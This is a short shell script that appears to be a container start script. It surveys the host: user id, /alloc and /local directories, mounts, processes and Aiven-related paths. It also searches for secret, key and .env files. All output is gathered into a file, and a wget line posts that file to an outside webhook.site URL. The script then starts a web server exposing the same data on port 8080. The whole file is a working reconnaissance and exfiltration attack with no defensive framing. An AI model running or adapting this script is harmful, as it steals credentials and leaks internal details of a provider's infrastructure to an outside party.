#!/bin/sh
{
echo "==id=="; id
echo "==alloc=="; ls -la /alloc 2>&1 | head -40; echo '---du---'; du -sh /alloc 2>/dev/null
echo "==local=="; ls -la /local 2>&1 | head -40
echo "==alloc-recurse=="; find /alloc -maxdepth 3 2>/dev/null | head -60
echo "==local-recurse=="; find /local -maxdepth 3 2>/dev/null | head -60
echo "==find-other="; find /alloc /local -maxdepth 4 -iname '*aiven*' -o -iname '*service*' -o -iname '*secret*' -o -iname '*.key' -o -iname '*.env' 2>/dev/null | head -40
echo "==mounts-full=="; cat /proc/mounts
echo "==home=="; ls -la /home /home/f6606826-d7d4-49df-a437-620a17f57338 2>&1 | head
echo "==etc=="; ls /etc/aiven /opt/aiven 2>&1 | head
echo "==procs=="; ps aux 2>/dev/null | head -30
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr3" >/dev/null 2>&1
httpd -f -p 8080 -h /www
